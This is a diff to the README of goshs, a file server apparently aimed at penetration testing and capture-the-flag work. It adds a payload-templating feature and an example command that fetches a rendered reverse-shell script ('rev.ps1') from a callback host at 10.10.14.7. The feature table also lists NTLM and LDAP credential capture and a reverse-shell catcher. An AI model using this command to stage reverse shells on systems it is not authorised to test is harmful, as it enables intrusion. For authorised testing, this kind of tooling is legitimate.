@@ -47,6 +47,10 @@ goshs --ttl 2h
 
 # Run with the interactive terminal dashboard (great for headless SSH sessions)
 goshs --tui
+
+# Serve payloads that auto-fill your callback host/port at download time
+goshs -i 10.10.14.7 --template --tpl-var LPORT=4444
+# fetch rendered: curl 'http://10.10.14.7:8000/rev.ps1?tpl'
 ```
 
 # Documentation
@@ -57,12 +61,13 @@ For a detailed documentation go to [docs.goshs.de](https://docs.goshs.de)
 
 | | |
 |---|---|
-| 📁 **File Operations** | Download, upload (drag & drop, POST/PUT), delete, bulk ZIP, QR codes |
+| 📁 **File Operations** | Download (resumable & seekable via HTTP Range), upload (drag & drop, POST/PUT), delete, bulk ZIP, QR codes |
 | 🔌 **Protocols** | HTTP/S, WebDAV, FTP/SFTP, SMB, LDAP/S |
 | 🔒 **Auth & Security** | Basic auth, certificate auth, TLS (self-signed, Let's Encrypt, custom cert), IP whitelist, file-based ACLs |
 | ⚙️ **Server Modes** | Read-only, upload-only, no-delete, silent, invisible, CLI command execution, TTL self-destruct |
 | 🔗 **Share Links** | Token-based sharing, download limit, time limit |
 | 🎯 **Collaboration / CTF** | DNS server, SMTP server, SMB NTLM hash capture + cracking, LDAP credential capture + NTLM hash cracking (JNDI mode for Log4Shell), redirect endpoint, Rev Shell Catcher + Payload generator |
+| 🧩 **Payload Templating** | Render `{{.LHOST}}`/`{{.LPORT}}` + custom `--tpl-var` values into served files on demand (`?tpl`) |
 | 🔔 **Integration** | Webhooks, tunnel via localhost.run, config file, JSON API, mDNS |
 | 🖥️ **TUI Dashboard** | Interactive full-screen terminal dashboard; live panes for HTTP, DNS, SMB, LDAP, SMTP, reverse shells and clipboard; attach and upgrade shells from the terminal |
 | 🛠️ **Misc** | Dark/light themes, clipboard, self-update, log output, embed files, drop privileges |
